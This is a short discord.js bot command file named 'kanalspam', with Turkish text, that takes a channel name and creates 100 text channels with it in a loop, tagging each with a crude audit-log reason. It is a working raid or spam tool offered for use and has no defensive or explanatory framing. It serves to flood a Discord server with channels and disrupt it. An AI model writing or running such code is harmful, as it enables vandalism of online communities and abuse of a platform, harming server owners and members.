const Discord = require('discord.js');
const db = require('quick.db')
exports.run = async(client, message, args) => { 
  
  let Asreaper = args.slice(0).join(' ');
  
  if(!Asreaper) return message.channel.send('Kanal İsmi Belirt!!')
  
 await message.react('😈')
  
  for (var i = 0; i < 100; i++) {
  message.guild.channels.create(Asreaper, { type: 'text', reason: 'Asreaper S2Ş' });
}
  
  
  };
exports.conf = {
  enabled: true,  
  guildOnly: false, 
  aliases: [], 
  permLevel: 3
};

exports.help = {
  name: 'kanalspam',
  description: 'taslak', 
  usage: 'kanal-spam'
};
